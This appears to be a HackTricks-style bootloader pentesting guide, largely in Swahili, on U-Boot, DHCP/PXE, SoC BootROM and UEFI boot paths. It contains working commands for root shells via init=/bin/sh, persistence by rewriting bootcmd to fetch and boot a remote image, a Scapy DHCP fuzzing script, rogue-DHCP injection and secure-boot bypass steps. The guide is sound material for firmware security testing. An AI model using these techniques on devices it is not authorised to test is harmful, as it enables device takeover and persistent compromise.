# Bootloader Testing

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kubadilisha mipangilio ya kuanzisha kifaa na kupima bootloaders such as U-Boot and UEFI-class loaders. Lenga kupata early code execution, kutathmini signature/rollback protections, na kutumia recovery au network-boot paths vibaya.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot quick wins and environment abuse

1. Access the interpreter shell
- Wakati wa boot, bonyeza break key inayojulikana (mara nyingi any key, 0, space, au sequence maalum ya board) kabla ya `bootcmd` kutekelezwa ili kuingia kwenye U-Boot prompt.

2. Inspect boot state and variables
- Amri muhimu:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modify boot arguments to get a root shell
- Ongeza `init=/bin/sh` ili kernel irejee kwenye shell badala ya init ya kawaida:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot from your TFTP server
- Sanidi network na pokea kernel/fit image kutoka LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persist changes via environment
- Ikiwa env storage haijalindwa kwa kuandika, unaweza kuhifadhi udhibiti:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Angalia variables kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` zinazoathiri fallback paths. Values zisizowekwa vizuri zinaweza kuruhusu kurudi mara kwa mara kwenye shell.

6. Check debug/unsafe features
- Tazama: `bootdelay` > 0, `autoboot` disabled, uwezo wa `usb start; fatload usb 0:1 ...`, uwezo wa `loady`/`loads` kupitia serial, `env import` kutoka media isiyotegemewa, na kernels/ramdisks zinazopakiwa bila signature checks.

7. U-Boot image/verification testing
- Ikiwa platform inadai secure/verified boot na FIT images, jaribu images zisizosainiwa na zilizoharibika:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Kukosekana kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani `verify=n` mara nyingi huruhusu booting arbitrary payloads.

## Network-boot surface (DHCP/PXE) and rogue servers

8. PXE/DHCP parameter fuzzing
- U-Boot’s legacy BOOTP/DHCP handling imekuwa na masuala ya memory-safety. Kwa mfano, CVE‑2024‑42040 inaelezea memory disclosure via crafted DHCP responses ambayo inaweza leak bytes kutoka U-Boot memory kurudi on the wire. Jaribu DHCP/PXE code paths na values zilizokuwa ndefu sana/edge-case (option 67 bootfile-name, vendor options, file/servername fields) na uangalie kwa hangs/leaks.
- Minimal Scapy snippet to stress boot parameters during netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Pia thibitisha kama PXE filename fields zinapitishwa kwa shell/loader logic bila sanitization wakati zinachained na OS-side provisioning scripts.

9. Rogue DHCP server command injection testing
- Sanidi rogue DHCP/PXE service na jaribu kuingiza characters kwenye filename au options fields ili kufikia command interpreters katika hatua za baadaye za boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, au Scapy custom scripts zinafanya kazi vizuri. Hakikisha umejenga lab network ya pekee kwanza.

## SoC ROM recovery modes that override normal boot

SoCs nyingi zinaonyesha BootROM "loader" mode itakayokubali code kupitia USB/UART hata kama flash images sio sahihi. Ikiwa secure-boot fuses hazijawashwa, hili linaweza kutoa arbitrary code execution mapema kabisa katika chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Thibitisha kama kifaa kina secure-boot eFuses/OTP zilizowashwa. Ikiwa hapana, BootROM download modes mara nyingi zinaweza bypass verification ya higher-level (U-Boot, kernel, rootfs) kwa kuendesha first-stage payload yako moja kwa moja kutoka SRAM/DRAM.

## UEFI/PC-class bootloaders: quick checks

10. ESP tampering and rollback testing
- Mount ESP na angalia loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Jaribu booting na downgraded au known-vulnerable signed boot components ikiwa Secure Boot revocations (dbx) haziko up-to-date. Ikiwa platform bado inaamini old shims/bootmanagers, mara nyingi unaweza kupakia kernel yako au `grub.cfg` kutoka ESP kupata persistence.

11. Boot logo parsing bugs (LogoFAIL class)
- OEM/IBV firmwares kadhaa zilikuwa na udhaifu katika image-parsing flaws za DXE ambazo zina process boot logos. Ikiwa mshambulizi anaweza kuweka crafted image kwenye ESP chini ya vendor-specific path (mfano, `\EFI\<vendor>\logo\*.bmp`) na kufanya reboot, code execution mapema inaweza kuwa inawezekana hata ikiwa Secure Boot imewezeshwa. Jaribu kuona kama platform inakubali logos za watumiaji na kama paths hizo zinaweza kuandikwa kutoka OS.

## Hardware caution

Kuwa mwangalifu wakati wa kushughulika na SPI/NAND flash wakati wa early boot (mfano, grounding pins ili bypass reads) na kila mara rejea flash datasheet. Shorts zisizowekwa kwa muda zinaweza kuharibu kifaa au programmer.

## Notes and additional tips

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` kuhamisha environment blobs kati ya RAM na storage; baadhi ya platforms huruhusu importing env kutoka removable media bila authentication.
- Kwa persistence kwenye systems za Linux ambazo zinaboot kupitia `extlinux.conf`, kubadilisha `APPEND` line (kuingiza `init=/bin/sh` au `rd.break`) kwenye boot partition mara nyingi inatosha wakati hakuna signature checks.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, hakikisha kwamba `/etc/fw_env.config` inalingana na env storage halisi. Offsets zisizowekwa vizuri zinakuwezesha kusoma/kuandika wrong MTD region.

## References

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
